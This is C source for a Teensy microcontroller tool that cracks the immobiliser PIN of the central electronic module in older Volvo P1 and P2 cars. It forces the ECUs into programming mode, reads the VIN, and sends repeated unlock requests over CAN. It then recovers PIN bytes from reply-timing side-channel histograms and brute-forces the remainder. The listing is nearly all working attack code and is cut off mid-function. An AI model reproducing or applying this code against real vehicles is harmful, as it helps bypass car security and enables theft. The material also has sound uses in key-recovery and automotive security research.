/* SPDX-License-Identifier: GPL-3.0 */
/*
   Copyright (C) 2020 Vitaly Mayatskikh <v.mayatskih@gmail.com>
                      Christian Molson <christian@cmolabs.org>
                      Mark Dapoz <md@dapoz.ca>

   This work is licensed under the terms of the GNU GPL, version 3.

   P1 tested settings:
          Teensy 4.0 with external CAN controllers
          SAMPLES = 5 Seems to work reliably
          CALC_BYTES = 4 does seem to work fine, 3 might be more reliable
          BUCKETS_PER_US 4
          CPU SPEED: 600MHz (default)
          OPTIMIZE: Fastest (default)

   P2 tested settings:
          Teensy 4.0 using internal and external CAN controllers
          SAMPLES = 30
          CALC_BYTES = 3
          NUM_LOOPS = 1000
          CPU SPEED: 600MHz (default)
          OPTIMIZE: Fastest (default)

   MCP2515 Library: https://github.com/vtl/CAN_BUS_Shield.git


   Hardware selection:

   Several hardware variants are supported:

    - Teensy 4.x with external MPC2515 CAN bus controllers
    - Teensy with internal dual CAN bus controllers
      - Only supported on Teensy 4.x and 3.6
    - Teensy with internal single CAN bus controller
      - Only supported on Teensy 3.1, 3.2 and 3.5

   The Teensy 4.0 configuration with the external MPC2515 controller is
   described in the provided schematic.  Selecting MPC2515_HW as the
   hardware configuration will utilize this hardware.

   The Teensy 4.x configuration uses the built-in CAN1 and CAN2 controllers.
   CAN1 is used for the high-speed bus and CAN2 is used for the low-speed bus.
   To enable the sampling of the high-speed CAN bus, the CAN1 receive pin
   (CRX1, pin 37 on 4.1, pin 25 on 4.0) must be connected to digital input 2
   (pin 4).

   The Teensy 3.6 configuration uses the built-in CAN0 and CAN1 controllers.
   CAN0 is used for the high-speed bus and CAN1 is used for the low-speed bus.
   To enable the sampling of the high-speed CAN bus, the CAN0 receive pin
   (pin 6) must be connected to digital input 2 (pin 4).

   The Teensy 3.1, 3.2, 3.5 configuration uses the built-in CAN1 controller
   for access to the high-speed bus.  Since only one controller is present on
   these models, it's not possible to connect to the low-speed bus.
   To enable the sampling of the high-speed CAN bus, the CAN receive pin
   must be connected to digital input 2.

   If the internal controllers are selected, the FlexCAN_T4 library must be
   available in your library (should already be present as part of Teensyduino).
   If it is missing it can be found here: https://github.com/tonton81/FlexCAN_T4

   External transcievers must be used to connect the Teensy to the CAN bus.

   Select TEENSY_CAN_HW as the hardware configuration to use the internal
   CAN controller.

*/


/* hardware selection */

#define MCP2515_HW      1   /* Teensy with external CAN controllers */
#define TEENSY_CAN_HW   2   /* Teensy with internal CAN controller */
//#define SHOW_CAN_STATUS

#define HW_SELECTION TEENSY_CAN_HW




#define DEBUG_LATENCY 1

#if (DEBUG_LATENCY==1)
uint8_t DEBUG_LATENCY_ENABLED = 0;
#endif

/* tunable parameters */

#define PLATFORM_UNKNOWN 0
#define PLATFORM_P1      1        /* P1 Platform (S40/V50/C30/C70) MC9S12xxXXX based */
#define PLATFORM_P2      2        /* P2 Platform (S60/S80/V70/XC70/XC90) M32C based */
uint8_t platform = PLATFORM_UNKNOWN;


#define STATE_IDLE                  0
#define STATE_INITIALIZING          1
#define STATE_CRACKING              2
#define STATE_INTERRUPT_REQUESTED   3
#define STATE_RESTART_REQUESTED     4
volatile uint8_t operatingState = STATE_IDLE;

#define HAS_CAN_LS          /* in the vehicle both low-speed and high-speed CAN-buses need to go into programming mode */
#define SAMPLES        35   /* number of samples per sequence, more is better (up to 100) (10 samples = ~3 minutes)*/
#define CALC_BYTES     3    /* how many PIN bytes to calculate (1 to 4), the rest is brute-forced */
#define NUM_LOOPS      2000 /* how many loops to do when calculating crack rate */

#define BUTTON_PIN 2

/* end of tunable parameters */

#include <stdio.h>

#if (HW_SELECTION == MCP2515_HW)
#include <SPI.h>
#include <mcp_can.h>
#include <mcp_can_dfs.h>
#elif (HW_SELECTION == TEENSY_CAN_HW)
#include <FlexCAN_T4.h>

#else
#error Hardware platform must be selected.
#endif


#if defined(__IMXRT1062__)
#define TEENSY_MODEL_4X
#elif defined(__MK66FX1M0__)
#define TEENSY_MODEL_36
#elif defined(__MK64FX512__)
#define TEENSY_MODEL_35
#elif defined(__MK20DX256__)
#define TEENSY_MODEL_32
#else
#error Unsupported Teensy model.
#endif


uint8_t BUCKETS_PER_US;                     /* how many buckets per microsecond do we store (1 means 1us resolution */
uint32_t CEM_REPLY_US;                 /* minimum time in us for CEM to reply for PIN unlock command (approx) */
uint8_t CEM_REPLY_TIMEOUT_MS;               /* maximum time in ms for CEM to reply for PIN unlock command (approx) */
uint8_t HISTOGRAM_DISPLAY_MIN;              /* minimum count for histogram display */
uint8_t HISTOGRAM_DISPLAY_MAX;              /* maximum count for histogram display */
uint8_t AVERAGE_DELTA_MIN;                  /* buckets to look at before the rolling average */
uint8_t AVERAGE_DELTA_MAX;                  /* buckets to look at after the rolling average  */

uint32_t *shuffleOrder;
uint32_t shuffleOrderP2[] = { 3, 1, 5, 0, 2, 4 };
//uint32_t shuffleOrderP1[] = { 0, 1, 2, 3, 4, 5 }; // original
uint32_t shuffleOrderP1[] = { 3, 2, 1, 4, 0, 5 }; // vaucher
//+uint32_t shuffleOrderP1[] = { 4, 2, 1, 5, 3, 0 }; 
//uint32_t shuffleOrderP1[] = { 5, 2, 1, 4, 0, 3 };
//uint32_t shuffleOrderP1[] = { 2, 0, 1, 3, 4, 5f };

uint8_t DUMP_BUCKETS          = 0;                    /* dump all buckets for debugging */
uint8_t USE_ROLLING_AVERAGE   = 0;                    /* use a rolling average latency for choosing measurements */


/* hardware defintions */

#if (HW_SELECTION == MCP2515_HW)

#define CAN_HS_CS_PIN 2         /* MCP2515 chip select pin CAN-HS */
#define CAN_LS_CS_PIN 3         /* MCP2515 chip select pin CAN-LS */
#define CAN_INTR_PIN  4         /* MCP2515 interrupt pin CAN-HS */
#define CAN_L_PIN    10         /* CAN-HS- wire, directly connected (CAN-HS, Low)*/

#define MCP2515_CLOCK MCP_8MHz  /* Different boards may have a different crystal, Seeed Studio is MCP_16MHZ */

MCP_CAN CAN_HS(CAN_HS_CS_PIN);
MCP_CAN CAN_LS(CAN_LS_CS_PIN);

#elif (HW_SELECTION == TEENSY_CAN_HW)

/* use FlexCAN driver */

#define CAN_L_PIN    10          /* CAN Rx pin connected to digital pin 2 */

#define CAN_500KBPS 500000      /* 500 Kbit speed */
#define CAN_125KBPS 125000      /* 125 Kbit speed */

/* CAN high-speed and low-speed controller objects */

#if defined(TEENSY_MODEL_4X)

/* Teensy 4.x */

FlexCAN_T4<CAN1, RX_SIZE_256, TX_SIZE_16> can_hs;
FlexCAN_T4<CAN2, RX_SIZE_256, TX_SIZE_16> can_ls;

#elif defined(TEENSY_MODEL_36)

/* Teensy 3.6 */

FlexCAN_T4<CAN0, RX_SIZE_256, TX_SIZE_16> can_hs;
FlexCAN_T4<CAN1, RX_SIZE_256, TX_SIZE_16> can_ls;

#elif defined(TEENSY_MODEL_35) || defined(TEENSY_MODEL_32)

/* Teensy 3.1, 3.2, 3.5 */

FlexCAN_T4<CAN0, RX_SIZE_256, TX_SIZE_16> can_hs;

/* only one CAN bus on these boards */

#undef  HAS_CAN_LS

#endif /* TEENSY_MODEL */

typedef enum {
  CAN_HS,       /* high-speed bus */
  CAN_LS        /* low-speed bus */
} can_bus_id_t;

#endif /* HW_SELECTION */


/* Interrupt to monitor button state  */
IntervalTimer buttonTimer;

/* use the ARM cycle counter as the time-stamp */

#define TSC ARM_DWT_CYCCNT

#define printf Serial.printf

/* CAN bus speeds to use */

#define CAN_HS_BAUD CAN_500KBPS
#define CAN_LS_BAUD CAN_125KBPS

#define CAN_MSG_SIZE    8       /* messages are always 8 bytes */
#define CEM_ECU_ID      0x50    /* P1/P2 CEM uses ECU id 0x50 in the messages */
#define PIN_LEN         6       /* a PIN has 6 bytes */

uint32_t averageReponse = 0;

/* measured latencies are stored for each of possible value of a single PIN digit */

typedef struct seq {
  uint8_t  pinValue;    /* value used for the PIN digit */
  uint32_t latency;     /* measured latency */
  uint32_t sum;
} sequence_t;

sequence_t sequence[100] = { 0 };


#define TICKS_PER_SECOND 10
volatile bool buttonState=false;
volatile bool canInterruptReceived = false;

/* assert macro for debugging */

#define assert(e) ((e) ? (void)0 : \
                   __assert__(__func__, __FILE__, __LINE__, #e))

/* Teensy function to set the core's clock rate */

extern "C" uint32_t set_arm_clock (uint32_t freq);

/* forward declarations */

void __assert__ (const char *__func, const char *__file,
                 int __lineno, const char *__sexp);
bool cemUnlock (uint8_t *pin, uint8_t *pinUsed, uint32_t *latency, bool verbose);

/*******************************************************************************

   canMsgSend - send message on the CAN bus (MPC2515 version)

   Returns: N/A
*/

#if (HW_SELECTION == MCP2515_HW)
void canMsgSend (MCP_CAN &bus, uint32_t id, uint8_t *data, bool verbose)
{

#ifndef HAS_CAN_LS

  /* return if there's no low-speed CAN bus available */

  if (&bus == &CAN_LS) {
    return;
  }
#endif

  if (verbose == true) {
    printf ("---> ID=%08x data=%02x %02x %02x %02x %02x %02x %02x %02x\n",
            id, data[0], data[1], data[2], data[3], data[4], data[5], data[6], data[7]);
  }

  bus.sendMsgBuf (id, CAN_EXTID, 8, data);
}

#elif (HW_SELECTION == TEENSY_CAN_HW)

/*******************************************************************************

   canMsgSend - send message on the CAN bus (FlexCAN_T4 version)

   Returns: N/A
*/

void canMsgSend (can_bus_id_t bus, uint32_t id, uint8_t *data, bool verbose)
{
  CAN_message_t msg;

  if (verbose == true) {
    printf ("---> ID=%08x data=%02x %02x %02x %02x %02x %02x %02x %02x\n",
            id, data[0], data[1], data[2], data[3], data[4], data[5], data[6], data[7]);
  }

  /* prepare the message to transmit */

  msg.id = id;
  msg.len = 8;
  msg.flags.extended = 1;
  memcpy (msg.buf, data, 8);

  /* send it to the appropriate bus */

  switch (bus) {
    case CAN_HS:
      can_hs.write (msg);
      break;

#if defined(HAS_CAN_LS)
    case CAN_LS:
      can_ls.write (msg);
      break;
#endif

    default:
      break;
  }

}
#endif /* HW_SELECTION */

#if (HW_SELECTION == TEENSY_CAN_HW)

/* storage for message received via event */

CAN_message_t eventMsg;
bool eventMsgAvailable = false;

/*******************************************************************************

   canHsEvent - FlexCAN_T4's message receive call-back

   Returns: N/A
*/

void canHsEvent (const CAN_message_t &msg)
{

  /* just save the message in a global and flag it as available */

  eventMsg = msg;
  eventMsgAvailable = true;
}

#endif /* HW_SELECTION */

/*******************************************************************************

   canMsgReceive - receive a CAN bus message

   Note: always processes messages from the high-speed bus

   Returns: true if a message was available, false otherwise
*/

bool canMsgReceive (uint32_t *id, uint8_t *data, bool wait, bool verbose)
{
  uint8_t *pData;
  uint32_t canId = 0;
  bool     ret = false;
  uint32_t start, timeout = 3000;

  start = TSC;

#if (HW_SELECTION == MCP2515_HW)
  uint8_t msg[CAN_MSG_SIZE] = { 0 };

  do {
    uint8_t len, rcvStat;

    /* poll if a message is available */

    rcvStat = CAN_HS.checkReceive ();
    //printf("Read status: %d\n", rcvStat);
    ret = (rcvStat == CAN_MSGAVAIL);
    if (ret == true) {

      /* retrieve available message and return it */

      CAN_HS.readMsgBuf (&len, msg);
      canId = CAN_HS.getCanId ();
      pData = msg;
    }
    //else printf ("wait\n");


    if(operatingState == STATE_INTERRUPT_REQUESTED)
    {
        wait = false;
    }
    
    //if(TSC-start > timeout) wait=false;


  } while ((ret == false) && (wait == true));

#elif (HW_SELECTION == TEENSY_CAN_HW)

  do {

    /* call FlexCAN_T4's event handler to process queued messages */

    can_hs.events ();

    /* check if a message was available and process it */

    if (eventMsgAvailable == true) {

      /* process the global buffer set by can_hs.events */

      eventMsgAvailable = false;
      canId = eventMsg.id;
      pData = eventMsg.buf;
      ret = true;
    }

    if(operatingState == STATE_INTERRUPT_REQUESTED)
    {
        wait = false;
    }

    //if(TSC-start > timeout) wait=false;
    
  } while ((ret == false) && (wait == true));

#endif /* HW_SELECTION */

  /* no message, just return an error */

  if (ret == false) {
    return ret;
  }

  /* save data to the caller if they provided buffers */

  if (id != NULL) {
    *id = canId;
  }

  if (data != NULL) {
    memcpy (data, pData, CAN_MSG_SIZE);
  }

  /* print the message we received */

  if (verbose == true) {
    printf ("<--- ID=%08x data=%02x %02x %02x %02x %02x %02x %02x %02x\n",
            canId, pData[0], pData[1], pData[2], pData[3], pData[4], pData[5], pData[6], pData[7]);
  }

  return ret;
}

/*******************************************************************************

   binToBcd - convert an 8-bit value to a binary coded decimal value

   Returns: converted 8-bit BCD value
*/

uint8_t binToBcd (uint8_t value)
{
  return ((value / 10) << 4) | (value % 10);
}

/*******************************************************************************

   bcdToBin - convert a binary coded decimal value to an 8-bit value

   Returns: converted 8-bit binary value
*/

uint8_t bcdToBin (uint8_t value)
{
  return ((value >> 4) * 10) + (value & 0xf);
}

/*******************************************************************************

   profileCemResponse - profile the CEM's response to PIN requests

   Returns: number of PINs processed per second
*/

uint32_t profileCemResponse (int8_t which_byte)
{
  uint8_t  pin[PIN_LEN] = { 0 };
  uint32_t start;
  uint32_t end;
  uint32_t latency;
  uint32_t rate;
  bool     verbose = false;

  printf("Profiling position %d...\n", which_byte);

  averageReponse = 0;

  /* start time in milliseconds */

  start = millis ();

  /* collect the samples */

  for (uint32_t i = 0; i < NUM_LOOPS; i++) 
  {

    /* average calculation is more reliable using random PIN digits */

    pin[which_byte] = random (0, 255);
    /*
        pin[1] = random (0, 255);
        pin[2] = random (0, 255);
        pin[3] = random (0, 255);
        pin[4] = random (0, 255);
        pin[5] = random (0, 255);
    */

    /* try and unlock the CEM with the random PIN */

    cemUnlock (pin, NULL, &latency, verbose);

    //printf("Latency: %d\n", latency);

    /* keep a running total of the average latency */

    averageReponse += latency / (clockCyclesPerMicrosecond () / BUCKETS_PER_US);
  }

  /* end time in milliseconds */

  end = millis ();

  /* calculate the average latency for a single response */

  averageReponse = averageReponse / NUM_LOOPS;

  /* number of PINs processed per second */

  rate = 1000 * NUM_LOOPS / (end - start);

  printf ("%u pins in %u ms, %u pins/s, average response: %uus\n", NUM_LOOPS, (end - start), rate, averageReponse);

/*
#if DEBUG_LATENCY==1
  while (1);
#endif
*/
  return rate;
}

/*******************************************************************************

   canInterruptHandler - CAN controller interrupt handler

   Returns: N/A
*/

void canInterruptHandler (void)
{

  /* we're only interested if the interrupt was received */

  canInterruptReceived = true;
  //printf("Interrupt received\n");
}

/*******************************************************************************

   cemUnlock - attempt to unlock the CEM with the provided PIN

   Returns: true if the CEM was unlocked, false otherwise
*/

bool cemUnlock (uint8_t *pin, uint8_t *pinUsed, uint32_t *latency, bool verbose)
{
  uint8_t  unlockMsg[CAN_MSG_SIZE] = { CEM_ECU_ID, 0xBE };
  uint8_t  reply[CAN_MSG_SIZE];
  uint8_t *pMsgPin = unlockMsg + 2;
  uint32_t start, end, limit;
  uint32_t id;
  uint32_t sampleCount;
  uint32_t maxSample = 0;
  uint32_t maxTime = 0;
  bool     replyWait = true;

  /* shuffle the PIN and set it in the request message */

  pMsgPin[shuffleOrder[0]] = pin[0];
  pMsgPin[shuffleOrder[1]] = pin[1];
  pMsgPin[shuffleOrder[2]] = pin[2];
  pMsgPin[shuffleOrder[3]] = pin[3];
  pMsgPin[shuffleOrder[4]] = pin[4];
  pMsgPin[shuffleOrder[5]] = pin[5];


  /* maximum time to collect our samples */

  limit = millis () + CEM_REPLY_TIMEOUT_MS;

  /* clear current interrupt status */

  canInterruptReceived = false;

  //buttonTimer.end();

  /* send the unlock request */

  canMsgSend (CAN_HS, 0xffffe, unlockMsg, verbose);
  //end = TSC;
  //printf("Transmission time: %d\n", end-start);

  /*
     Sample the CAN bus and determine the longest time between bit transitions.

     The measurement is done in parallel with the CAN controller transmitting the
     CEM unlock message.  The longest time will occur between the end of message
     transmission (acknowledge slot bit) of the current message and the start of
     frame bit of the CEM's reply.

     The sampling terminates when any of the following conditions occurs:
      - the CAN controller generates an interrupt from a received message
      - a measured time between bits is greater than the expected CEM reply time
      - a timeout occurs due to no bus activity
  */


  for (sampleCount = 0, start = TSC;
       (canInterruptReceived == false) &&
       (millis () < limit) &&
       (maxTime < CEM_REPLY_US * clockCyclesPerMicrosecond ())
       ;) {

    /* if the line is high, the CAN bus is either idle or transmitting a bit */

    if (digitalRead (CAN_L_PIN) == 1) {

      /* count how many times we've seen the bus in a "1" state */
#if (DEBUG_LATENCY==1)
        if( DEBUG_LATENCY_ENABLED==1)
        {
          printf("A");
        }
#endif
      sampleCount++;
      continue;
    }

    /* the CAN bus isn't idle, it's the start of the next bit */

    end = TSC;

    /* we only need to track the longest time we've seen */

    if (sampleCount > maxSample) {
      maxSample = sampleCount;
      sampleCount = 0;

      /* track the time in clock cycles */

      maxTime = end - start;
      //printf("TIME: %d - %d = %d (%d ticks) \n", start, end, maxTime, maxSample);

    }

    /* wait for the current transmission to finish before sampling again */

    while (digitalRead (CAN_L_PIN) == 0) {

#if DEBUG_LATENCY==1
    if( DEBUG_LATENCY_ENABLED==1)
    {
          printf("_");
    }
#endif

      /* abort if we've hit our timeout */
      if (millis () >= limit) {
        break;
      }
    }

    /* start of the next sample */

    start = TSC;
    sampleCount = 0;
  }

  //buttonTimer.begin(buttonTimerHandler, 1000000/TICKS_PER_SECOND);  // check button state every XX second

#if DEBUG_LATENCY == 1
    if( DEBUG_LATENCY_ENABLED==1)
    {
      printf("\n");
      if (canInterruptReceived == true) printf("Exit on interrupt\n");
      if (millis () >= limit) printf("Exit on limit (%d)\n", limit);
      if (maxTime >= CEM_REPLY_US * clockCyclesPerMicrosecond ()) printf("Exit on timeout\n");
      printf("Ticks: %d, Latency: %d\n", maxSample, maxTime);
    }
#endif



  /* check for a timeout condition */

  if (millis () >= limit) {
    printf ("Timeout waiting for CEM reply!\n");

    /* additional time in case there is sth to process */
    delay (1000);
    
    //while(1);

    /* on a timeout, try and see if there is anything in the CAN Rx queue */

    replyWait = false;
  }

  /* default reply is set to indicate a failure */

  memset (reply, 0, sizeof(reply));
  reply[2] = 0xff;

  /* see if anything came back from the CEM */

  (void) canMsgReceive (&id, reply, replyWait, false);

  /* return the maximum time between transmissions that we saw on the CAN bus */

  if (latency != NULL) {
    *latency = maxTime;
  }

  /* return PIN used if the caller wants it */

  if (pinUsed != NULL) {
    memcpy (pinUsed, pMsgPin, PIN_LEN);
  }

  /* a reply of 0x00 indicates CEM was unlocked */

  return reply[2] == 0x00;
}

/*******************************************************************************

   ecuPrintPartNumber - read an ECU's hardware part number

   Returns: N/A
*/

void ecuPrintPartNumber (uint8_t ecuId)
{
  uint32_t id;
  uint8_t  data[CAN_MSG_SIZE] = { ecuId, 0x88, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
  bool     verbose = false;

  printf ("Reading part number from ECU 0x%02x\n", ecuId);

  /* set the ECU id in the message */

  data[0] = ecuId;

  /* send the message */

  canMsgSend (CAN_HS, 0xffffe, data, verbose);

  /* get the reply */

  memset (data, 0, sizeof(data));
  (void) canMsgReceive (&id, data, true, verbose);

  printf ("Part Number: %02u%02u%02u%02u\n",
          bcdToBin (data[4]), bcdToBin (data[5]),
          bcdToBin (data[6]), bcdToBin (data[7]));
}




void progModeSend (void)
{
  uint8_t  data[CAN_MSG_SIZE] = { 0xFF, 0x86, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };

    canMsgSend (CAN_HS, 0xffffe, data, false);
    canMsgSend (CAN_LS, 0xffffe, data, false);
}




/*******************************************************************************

   progModeOn - put all ECUs into programming mode

   Returns: N/A
*/

void progModeOn (void)
{
  uint32_t time = 500;
  uint32_t delayTime = 5;
  bool     verbose = true;

  operatingState = STATE_CRACKING;
  printf ("Putting all ECUs into programming mode.\n");

  /* broadcast a series of PROG mode requests */

  while (time > 0) {
    progModeSend();

    verbose = false;
    time -= delayTime;
    delay (delayTime);
  }
}




/*******************************************************************************

   progModeOff - reset all ECUs to get them out of programming mode

   Returns: N/A
*/

void progModeOff (void)
{
  uint8_t data[CAN_MSG_SIZE] = { 0xFF, 0xc8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
  bool    verbose = false;

  printf ("Resetting all ECUs...\n");

  /* broadcast a series of reset requests */

  for (uint32_t i = 0; i < 25; i++) {
    canMsgSend (CAN_HS, 0xffffe, data, verbose);
    canMsgSend (CAN_LS, 0xffffe, data, verbose);

    verbose = false;
    delay (100);
  }

  operatingState = STATE_IDLE;
}



void identifyPlatform (void)
{
  uint8_t  data[CAN_MSG_SIZE] = { 0xFF, 0xC8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
  uint8_t  rcvData[26*7] = { 0 };
  uint32_t time = 100, i;
  uint32_t delayTime = 5;
  uint32_t id;
  bool     verbose = false;
  bool     platform_detected = false;


  operatingState = STATE_INITIALIZING;

  printf ("Retreiving VIN...\n");

//platform=PLATFORM_P1;
//return;
    canMsgSend (CAN_HS, 0xffffe, data, verbose);

    data[0] = 0xD8;
    data[1] = 0x00;
    canMsgSend (CAN_HS, 0xffffe, data, verbose);

    
    data[0] = 0xCB;
    data[1] = 0x50;
    data[2] = 0xB9;
    data[3] = 0xFB;
    canMsgSend (CAN_HS, 0xffffe, data, verbose);

    id=0;
    while( (id&0x3) != 0x3)
    {
        if(canMsgReceive (&id, data, true, verbose))
        {
            if(verbose) printf("ID: 0x%x 0x%x\n", id, id&0x3);
        }
        else
        {
            printf("Read timeout. Assuming platform P1.\n");
            platform=PLATFORM_P1;
            break;
        }

        if( operatingState != STATE_INITIALIZING ) return;
    }
    memcpy(rcvData+0*7,data+1,sizeof(uint8_t)*7);

    if(id==0x1200003)
    {
        printf("Detected platform P2\n");
        platform=PLATFORM_P2;
        platform_detected = true;
    }
    else if(id==0x400003)
    {
        printf("Detected platform P1\n");
        platform=PLATFORM_P1;
        platform_detected = true;
    }
    else
    {
        printf("Unkown platform :( id=0x%x\n", id);
    }

    if(platform_detected)
    {
        for(i=1;;i++)
        {
            id=0;
            while( (id&0x3) != 0x3) 
            {
                canMsgReceive (&id, data, true, verbose);
                if( operatingState != STATE_INITIALIZING ) return;
            }
            memcpy(rcvData+i*7,data+1,sizeof(uint8_t)*7);
            if( (data[0] & 0xf0) == 0x40 || i>=25) break;
        }
    

      /*
      printf ("ALL: ");
    
      for(i=0;i<25*7;i++)
      {
        printf("%c", rcvData[i]);
      }
      printf("\n");
      */
      

          printf ("VIN: ");
          for(i=14;i<=30;i++)
          {
            printf("%c", rcvData[i]);
          }
          printf("\n");
    
          printf ("Chasis: ");
          for(i=49;i<=54;i++)
          {
            printf("%c", rcvData[i]);
          }
          printf("\n");
    
          printf ("Structure week: ");
          for(i=61;i<=66;i++)
          {
            printf("%c", rcvData[i]);
          }
          printf("\n");
    }    


  if (platform == PLATFORM_P2)
  {

    /* P2 platform settings: S80, V70, XC70, S60, XC90 */

    BUCKETS_PER_US        = 1;                    /* how many buckets per microsecond do we store (1 means 1us resolution */
    CEM_REPLY_US          = 100 * BUCKETS_PER_US; /* minimum time in us for CEM to reply for PIN unlock command (approx) */
    CEM_REPLY_TIMEOUT_MS  = 2;                    /* maximum time in ms for CEM to reply for PIN unlock command (approx) */
    HISTOGRAM_DISPLAY_MIN = 10 * BUCKETS_PER_US;   /* minimum count for histogram display below average */
    HISTOGRAM_DISPLAY_MAX = 10 * BUCKETS_PER_US;   /* maximum count for histogram display above average */

    DUMP_BUCKETS           = 0;                    /* dump all buckets for debugging, used only for P1 */

    shuffleOrder = shuffleOrderP2;

  }
  else if (platform == PLATFORM_P1)
  {
    /* P1 platform settings: S40, V50, C30, C70 */

    BUCKETS_PER_US        = 1;                    /* how many buckets per microsecond do we store (4 means 1/4us or 0.25us resolution */
    CEM_REPLY_US          = (100 * BUCKETS_PER_US); /* minimum time in us for CEM to reply for PIN unlock command (approx) */
    CEM_REPLY_TIMEOUT_MS  = 2;                    /* maximum time in ms for CEM to reply for PIN unlock command (approx) */
    HISTOGRAM_DISPLAY_MIN =  7 * BUCKETS_PER_US;//8;                    /* minimum count for histogram display (8us below average) */
    HISTOGRAM_DISPLAY_MAX = 20 * BUCKETS_PER_US;//24;                   /* maximum count for histogram display (24us above average) */

    DUMP_BUCKETS          = 0;                    /* dump all buckets for debugging */

    /* P1 processes the key in order
       The order in flash is still shuffled though
       Order in flash: 5, 2, 1, 4, 0, 3
    */
    shuffleOrder = shuffleOrderP1;

  }
  else
  {
    printf("Unknown platform - this should not happen\n");        /* must pick PLATFORM_P1 or PLATFORM_P2 above */
  }

/*
  printf("BUCKETS_PER_US: %d\n", BUCKETS_PER_US);
  printf("AVERAGE_DELTA_MIN: %d\n", AVERAGE_DELTA_MIN);
  printf("AVERAGE_DELTA_MAX: %d\n", AVERAGE_DELTA_MAX);
  printf("CEM_REPLY_US: %d\n", CEM_REPLY_US);
  printf("CEM_REPLY_TIMEOUT_MS: %d\n", CEM_REPLY_TIMEOUT_MS);
  printf("HISTOGRAM_DISPLAY_MIN: %d\n", HISTOGRAM_DISPLAY_MIN);
  printf("HISTOGRAM_DISPLAY_MAX: %d\n", HISTOGRAM_DISPLAY_MAX);
  printf("DUMP_BUCKETS: %d\n", DUMP_BUCKETS);
  printf("USE_ROLLING_AVERAGE: %d\n", USE_ROLLING_AVERAGE);
*/
}

/*******************************************************************************

   seq_max - quicksort comparison function to find highest latency

   Returns: integer less than zero, zero or greater than zero
*/

int seq_max (const void *a, const void *b)
{
  sequence_t *_a = (sequence_t *)a;
  sequence_t *_b = (sequence_t *)b;

  return _b->latency - _a->latency;
}

/*******************************************************************************

   crackPinPosition - attempt to find a specific digit in the PIN

   Returns: N/A
*/

void crackPinPosition (uint8_t *pin, uint32_t pos, bool verbose)
{
  uint32_t histogram[CEM_REPLY_US];
  uint32_t latency;
  uint32_t prod;
  uint32_t sum;
  uint8_t  pin1;
  uint8_t  pin2;
  uint32_t i;
  uint32_t k;

  /* we process three digits in this code */

  assert (pos <= (PIN_LEN - 3));

  /* clear collected latencies */

  memset (sequence, 0, sizeof(sequence));

  /* print the latency histogram titles */
  printf("           Delay (us): ");
  for (k = 0; k < CEM_REPLY_US; k++) {
    if ((k >= averageReponse - HISTOGRAM_DISPLAY_MIN) &&
        (k <= averageReponse + HISTOGRAM_DISPLAY_MAX)) {
      printf ("%3u ", k);
    }
  }
  printf("\n");

  /* iterate over all possible values for the PIN digit */

  for (pin1 = 0; pin1 < 100; pin1++) {

    /* set PIN digit */

    pin[pos] = binToBcd (pin1);

    /* print a progress message for each PIN digit we're processing */

    printf ("[ ");

    /* show numerial values for the known digits */

    for (i = 0; i <= pos; i++) {
      printf ("%02x ", pin[i]);
    }

    /* placeholder for the unknown digits */

    while (i < PIN_LEN) {
      printf ("-- ");
      i++;
    }

    printf ("]: ");

    /* clear histogram data for the new PIN digit */

    memset (histogram, 0, sizeof(histogram));

    /* iterate over all possible values for the adjacent PIN digit */

    for (pin2 = 0; pin2 < 100; pin2++) {

      /* set PIN digit */

      pin[pos + 1] = binToBcd (pin2);

      /* collect latency measurements the PIN pair */

      for (uint32_t j = 0; j < SAMPLES; j++) {

        /* iterate the next PIN digit (third digit) */

        //pin[pos + 2] = binToBcd ((uint8_t)( random(0,255) & 0xff));
        pin[pos + 2] = binToBcd ((uint8_t)( j & 0xff));

        /* try and unlock and measure the latency */

        cemUnlock (pin, NULL, &latency, verbose);

        /* calculate the index into the historgram */

        uint32_t idx = latency / (clockCyclesPerMicrosecond () / BUCKETS_PER_US);

        if (idx >= CEM_REPLY_US) {
          idx = CEM_REPLY_US - 1;
        }

        /* bump the count for this latency */

        histogram[idx]++;

        
        /* check if user didn't want to interrupt */
        if(operatingState == STATE_INTERRUPT_REQUESTED)
        {
            return;
        }

      }
    }

    /* clear the digits we just used for latency iteration */

    pin[pos + 1] = 0;
    pin[pos + 2] = 0;

    /* clear statistical values we're calculating */

    prod = 0;
    sum  = 0;


    /* dump buckets for debug purposes */

    if (DUMP_BUCKETS && platform == PLATFORM_P1)
    {
      printf ("Average latency: %u\n", averageReponse);

      for (k = 0; k < CEM_REPLY_US; k++) {
        if (histogram[k] != 0) {
          printf ("%4u : %5u\n", k, histogram[k]);
        }
      }
    }

    if (DUMP_BUCKETS && platform == PLATFORM_P2)
    {
      for (k = 0; k < CEM_REPLY_US; k++) {

        /* print the latency histogram for relevant values */

        if ((k >= averageReponse - HISTOGRAM_DISPLAY_MIN) &&
            (k <= averageReponse + HISTOGRAM_DISPLAY_MAX)) {
          printf ("%03u ", histogram[k]);
        }
      }
    }

    /* loop over the histogram values */

    for (k = 0 ; k < CEM_REPLY_US; k++) {


      /* verify limit in case parameters are wrong */

      if (k > CEM_REPLY_US) {
        continue;
      }

      /* print the latency histogram for relevant values */

      if ((k >= (averageReponse - HISTOGRAM_DISPLAY_MIN)) &&
          (k <= (averageReponse + HISTOGRAM_DISPLAY_MAX))) {
        printf ("%03u ", histogram[k]);
        //prod += histogram[k] * k;
        //sum  += histogram[k];
      }

      /* calculate weighted count and total of all entries */

      //if(histogram[k]>30) /* ignore noise */
      {
        prod += histogram[k] * k;
        sum  += histogram[k];
      }
    }

    //progModeSend();

    printf (": %u\n", prod);

    /* store the weighted average count for this PIN value */

    sequence[pin1].pinValue = pin[pos];
    sequence[pin1].latency  = prod;
    sequence[pin1].sum  = sum;
  }

  /* sort the collected sequence of latencies */

  qsort (sequence, 100, sizeof(sequence_t), seq_max);

  /* print the top 25 latencies and their PIN value */

  for (uint32_t i = 0; i < 25; i++) {
    printf ("%u: %02x = %u\n", i, sequence[i].pinValue, sequence[i].latency);
  }


  /* choose the PIN value that has the highest latency */

  printf ("pin[%u] candidate: %02x with latency %u\n", pos, sequence[0].pinValue, sequence[0].latency);

  /* print a warning message if the top two are close, we might be wrong */

  if ((sequence[0].latency - sequence[1].latency) < clockCyclesPerMicrosecond ()) {
    printf ("Warning: Selected candidate is very close to the next candidate!\n");
    printf ("         Selection may be incorrect.\n");
  }



  /* set the digit in the overall PIN */

  pin[pos] = sequence[0].pinValue;
  pin[pos + 1] = 0;


